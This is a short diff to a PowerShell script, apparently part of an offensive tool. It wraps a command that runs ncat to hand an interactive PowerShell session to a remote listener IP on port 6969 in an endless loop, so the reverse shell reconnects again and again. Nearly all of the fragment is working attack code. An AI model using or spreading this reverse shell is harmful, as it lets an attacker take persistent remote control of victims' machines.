@@ -21,7 +21,9 @@ $ListenerIP = $string.Matches.Value
 Write-Output "IP Extracted"
 #>
 
+for (;;)
+{
 # connect to listener
 Write-Output "Connecting to listener"
 .\ncat.exe -C --exec "powershell.exe" $ListenerIP 6969
-
+}
